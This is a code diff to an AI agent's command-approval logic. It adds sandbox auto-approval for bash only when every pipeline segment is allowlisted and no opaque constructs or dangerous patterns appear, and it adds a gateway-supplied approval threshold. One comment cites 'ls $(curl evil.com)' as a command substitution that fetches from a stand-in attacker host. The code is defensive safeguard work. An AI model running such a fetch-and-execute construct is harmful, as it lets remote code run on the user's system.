@@ -22,8 +22,14 @@ import {
   resolveThreshold,
 } from "./approval-policy.js";
 import { bashRiskClassifier } from "./bash-risk-classifier.js";
+import { DEFAULT_COMMAND_REGISTRY } from "./command-registry.js";
 import { fileRiskClassifier } from "./file-risk-classifier.js";
-import { type RiskAssessment, riskToRiskLevel } from "./risk-types.js";
+import { getAutoApproveThreshold } from "./gateway-threshold-reader.js";
+import {
+  type CommandRiskSpec,
+  type RiskAssessment,
+  riskToRiskLevel,
+} from "./risk-types.js";
 import {
   buildShellAllowlistOptions,
   buildShellCommandCandidates,
@@ -589,13 +595,43 @@ export async function check(
     policyContext,
   );
 
+  // Resolve sandboxAutoApprove for bash commands — all pipeline segments must be
+  // on the allowlist, and the command must not contain opaque constructs or
+  // dangerous patterns (e.g. `ls $(curl evil.com)` has an allowlisted program
+  // but a command substitution that could execute arbitrary code).
+  let hasSandboxAutoApprove = false;
+  if (toolName === "bash" && shellParsed) {
+    hasSandboxAutoApprove =
+      shellParsed.segments.length > 0 &&
+      !shellParsed.hasOpaqueConstructs &&
+      shellParsed.dangerousPatterns.length === 0 &&
+      shellParsed.segments.every((seg) => {
+        const name = seg.program.split("/").pop() ?? seg.program;
+        const spec: CommandRiskSpec | undefined = Object.hasOwn(
+          DEFAULT_COMMAND_REGISTRY,
+          name,
+        )
+          ? DEFAULT_COMMAND_REGISTRY[
+              name as keyof typeof DEFAULT_COMMAND_REGISTRY
+            ]
+          : undefined;
+        return spec?.sandboxAutoApprove === true;
+      });
+  }
+
   // Build approval context from local variables
   const tool = getTool(toolName);
   const config = getConfig();
-  const resolvedThreshold = resolveThreshold(
-    config.permissions.autoApproveUpTo,
+  const gatewayThreshold = await getAutoApproveThreshold(
+    policyContext?.conversationId,
     policyContext?.executionContext,
   );
+  const resolvedThreshold =
+    gatewayThreshold ??
+    resolveThreshold(
+      config.permissions.autoApproveUpTo,
+      policyContext?.executionContext,
+    );
   const approvalContext: ApprovalContext = {
     riskLevel: risk,
     toolName,
@@ -611,6 +647,7 @@ export async function check(
     isSkillBundled: tool?.ownerSkillBundled ?? false,
     hasManifestOverride: !!manifestOverride,
     autoApproveUpTo: resolvedThreshold,
+    hasSandboxAutoApprove,
   };
 
   // Delegate the allow/prompt/deny decision to the approval policy
